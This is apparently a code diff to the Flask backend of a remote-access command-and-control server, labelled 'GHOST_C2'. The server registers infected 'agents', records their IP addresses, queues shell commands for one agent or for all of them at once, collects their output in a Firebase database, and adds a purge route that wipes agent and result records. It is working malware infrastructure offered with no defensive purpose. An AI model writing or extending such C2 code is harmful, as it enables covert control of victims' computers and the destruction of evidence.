@@ -9,24 +9,26 @@ from functools import wraps
 app = Flask(__name__)
 app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99"
 
-# --- CONFIGURACIÓN FIREBASE DIRECTA (REST) ---
 DB_URL = "https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app"
 
 def db_get(path):
     try:
         r = requests.get(f"{DB_URL}/{path}.json")
         return r.json() or {}
-    except:
-        return {}
+    except: return {}
 
 def db_update(path, data):
     try:
         requests.patch(f"{DB_URL}/{path}.json", json=data)
         return True
-    except:
-        return False
+    except: return False
 
-# --- DECORADOR ---
+def db_delete(path):
+    try:
+        requests.delete(f"{DB_URL}/{path}.json")
+        return True
+    except: return False
+
 def login_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -35,7 +37,6 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-# --- WEB ---
 @app.route('/')
 @login_required
 def index():
@@ -49,14 +50,23 @@ def login():
             return redirect(url_for('index'))
     return render_template('login.html')
 
-# --- API AGENTE (Corregida según tus logs) ---
+# --- ACCIÓN PARA LIMPIAR TODO ---
+@app.route('/api/v1/purge', methods=['POST'])
+@login_required
+def purge():
+    db_delete('agents')
+    db_delete('results')
+    return jsonify({"status": "database_cleaned"})
+
 @app.route('/api/v1/agent/register', methods=['POST'])
 def agent_register():
     data = request.json
-    agent_id = data.get('agent_id')
+    agent_id = data.get('id')
     if agent_id:
         data['last_seen'] = datetime.utcnow().isoformat()
+        data['ip'] = request.remote_addr
         db_update(f'agents/{agent_id}', data)
+        print(f">>> [!] NUEVO AGENTE CONECTADO: {agent_id}")
         return jsonify({"status": "success"})
     return jsonify({"status": "error"}), 400
 
@@ -72,14 +82,14 @@ def agent_get_command(agent_id):
 @app.route('/api/v1/agent/result', methods=['POST'])
 def agent_post_result():
     data = request.json
-    agent_id = data.get('agent_id')
+    agent_id = data.get('id')
     if agent_id:
-        entry = {"timestamp": datetime.utcnow().isoformat(), "output": data.get('output', '')}
+        result_text = data.get('result', '')
+        entry = {"timestamp": datetime.utcnow().strftime('%H:%M:%S'), "result": result_text}
         requests.post(f"{DB_URL}/results/{agent_id}.json", json=entry)
         return jsonify({"status": "success"})
     return jsonify({"status": "error"}), 400
 
-# API PANEL
 @app.route('/api/v1/agents', methods=['GET'])
 @login_required
 def api_get_agents():
@@ -88,20 +98,24 @@ def api_get_agents():
 @app.route('/api/v1/results/<agent_id>', methods=['GET'])
 @login_required
 def api_get_results(agent_id):
-    if agent_id == "all":
-        return jsonify(db_get('results'))
     return jsonify(db_get(f'results/{agent_id}'))
 
 @app.route('/api/v1/command', methods=['POST'])
 @login_required
 def api_send_command():
     data = request.json
-    agent_id = data.get('agent_id')
+    agent_id = data.get('id')
     command = data.get('command')
+    if agent_id == 'all':
+        agents = db_get('agents')
+        for aid in (agents or {}):
+            db_update(f'agents/{aid}', {"pending_command": command})
+        return jsonify({"status": "success"})
     if agent_id and command:
         db_update(f'agents/{agent_id}', {"pending_command": command})
         return jsonify({"status": "success"})
     return jsonify({"status": "error"}), 400
 
 if __name__ == '__main__':
+    print(">>> SERVIDOR INICIADO EN http://127.0.0.1:5000")
     app.run(debug=True, port=5000)
